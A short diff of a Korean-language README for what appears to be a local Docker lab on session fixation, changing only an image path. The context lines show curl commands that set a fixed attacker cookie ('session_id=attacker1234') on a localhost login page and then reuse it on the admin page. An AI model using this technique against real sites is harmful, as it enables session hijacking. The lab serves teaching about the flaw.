@@ -26,7 +26,7 @@ docker compose up -d 또는 docker compose up --build
 ```bash
 curl -i -H "Cookie: session_id=attacker1234" http://localhost:3000/login
 ````
-![](2.png)
+![](images/2.png)
 동일한 세션으로 관리자 페이지에 요청을 보냅니다.
 ```bash
 curl -i -H "Cookie: session_id=attacker1234" http://localhost:3000/admim
